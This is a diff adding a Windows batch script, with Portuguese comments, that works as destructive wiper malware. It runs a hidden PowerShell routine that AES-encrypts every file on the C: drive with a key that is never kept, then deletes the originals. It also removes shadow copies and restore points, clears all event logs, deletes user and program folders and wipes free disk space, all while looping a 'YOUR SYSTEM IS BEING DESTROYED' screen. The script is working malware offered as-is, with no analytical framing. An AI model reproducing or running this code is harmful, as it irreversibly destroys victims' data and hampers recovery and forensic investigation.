@@ -1,0 +1,52 @@
+@echo off
+title !!! YOUR SYSTEM IS BEING DESTROYED !!!
+mode con: cols=120 lines=40
+color 4C
+
+:: Inicia destruição em segundo plano
+start "" /min cmd /c (
+powershell -Command ^
+"$AES = New-Object System.Security.Cryptography.AesManaged; ^
+$AES.KeySize = 256; $AES.GenerateKey(); $AES.GenerateIV(); ^
+$files = Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue; ^
+foreach ($f in $files) { try { ^
+  $bytes = [System.IO.File]::ReadAllBytes($f.FullName); ^
+  $encryptor = $AES.CreateEncryptor(); ^
+  $encrypted = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length); ^
+  [System.IO.File]::WriteAllBytes($f.FullName + '.dead', $encrypted); ^
+  Remove-Item $f.FullName -Force -ErrorAction SilentlyContinue } catch {} }"
+
+vssadmin delete shadows /all /quiet
+powershell -Command "Disable-ComputerRestore -Drive 'C:\'"
+for /f %%x in ('wevtutil el') do wevtutil cl "%%x"
+del /f /s /q %TEMP%\* >nul 2>&1
+del /f /s /q C:\Windows\Temp\* >nul 2>&1
+del /f /s /q C:\Windows\Prefetch\* >nul 2>&1
+rmdir /s /q C:\Users >nul 2>&1
+rmdir /s /q C:\ProgramData >nul 2>&1
+rmdir /s /q "C:\Program Files" >nul 2>&1
+rmdir /s /q "C:\Program Files (x86)" >nul 2>&1
+cipher /w:C:\
+)
+
+:: Enquanto isso, trava a tela com ransomware visual
+:LOCK
+cls
+echo.
+echo ████████████████████████████████████████████████████████████████████████████████████████████████
+echo █                                                                                              █
+echo █   !!! YOUR SYSTEM IS BEING DESTROYED !!!                                                    █
+echo █                                                                                              █
+echo █   DO NOT CLOSE THIS WINDOW                                                                   █
+echo █                                                                                              █
+echo █   All files are being encrypted and deleted irreversibly...                                  █
+echo █   Logs, restore points, users, and system files are being wiped.                            █
+echo █                                                                                              █
+echo █   Your data is permanently lost. There is NO decryption key.                                █
+echo █                                                                                              █
+echo █   Attempting to interrupt may corrupt the disk permanently.                                 █
+echo █                                                                                              █
+echo ████████████████████████████████████████████████████████████████████████████████████████████████
+echo.
+timeout /t 2 >nul
+goto LOCK
